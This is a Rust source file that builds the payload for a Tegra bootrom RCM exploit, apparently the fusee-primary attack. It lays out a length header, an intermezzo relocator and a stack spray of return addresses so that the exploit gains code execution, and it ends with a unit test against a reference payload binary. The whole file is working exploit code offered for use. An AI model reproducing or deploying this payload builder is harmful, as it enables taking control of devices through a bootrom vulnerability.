use std::io::{self, Read};
use std::iter::repeat;
use std::mem;

use crate::constants::*;

#[derive(Debug)]
pub enum PayloadBuildError {
    TooLong,
    IoError(io::Error),
}

impl From<io::Error> for PayloadBuildError {
    fn from(err: io::Error) -> Self {
        PayloadBuildError::IoError(err)
    }
}

pub fn build_payload<R1: Read, R2: Read>(
    mut intermezzo: R1,
    mut target: R2,
) -> Result<Vec<u8>, PayloadBuildError> {
    // The maximum length accepted by RCM. This allows us to transmit as large of a payload as
    // possible; however, it is expected that the exploit will grant us control before the end.
    const LENGTH: u32 = 0x30298;

    let mut payload: Vec<u8> = Vec::with_capacity(16384);
    payload.extend_from_slice(&LENGTH.to_le_bytes());
    payload.extend(repeat(0u8).take(680 as usize - mem::size_of_val(&LENGTH)));
    let intermezzo_size = intermezzo.read_to_end(&mut payload)?;
    payload.extend(repeat(0).take(PAYLOAD_START_ADDR - RCM_PAYLOAD_ADDR - intermezzo_size));

    // Read the payload. Place part of the payload before the stack spray and place the
    // remainder after the stack spray.
    let mut target_payload: Vec<u8> = Vec::new();
    target.read_to_end(&mut target_payload)?;
    let (target_before, target_after) = {
        let pre_spray_size = STACK_SPRAY_START - PAYLOAD_START_ADDR;
        (
            &target_payload[0..pre_spray_size],
            &target_payload[pre_spray_size..],
        )
    };
    let stack_spray = {
        let repeats = (STACK_SPRAY_END - STACK_SPRAY_START) / 4;
        (0..repeats).map(|_| (RCM_PAYLOAD_ADDR as u32).to_le_bytes())
    };
    payload.extend_from_slice(target_before);
    stack_spray.for_each(|slice| payload.extend_from_slice(&slice));
    payload.extend_from_slice(target_after);

    // Pad the payload to the nearest multiple of 0x1000, thereby completely filling the
    // buffer.
    payload.extend(repeat(0).take(0x1000 - (payload.len() % 0x1000)));

    // Check that the payload size is within the exploit's acceptable range.
    if payload.len() > LENGTH as usize {
        Err(PayloadBuildError::TooLong)
    } else {
        Ok(payload)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn payload_equality() {
        let reference = include_bytes!("data/original-payload.bin");

        let intermezzo = include_bytes!("data/intermezzo.bin");
        let target = include_bytes!("data/fusee-primary.bin");

        let payload = build_payload(&intermezzo[..], &target[..]).expect("Failed to build payload");

        assert_eq!(payload.as_slice(), reference);
    }
}
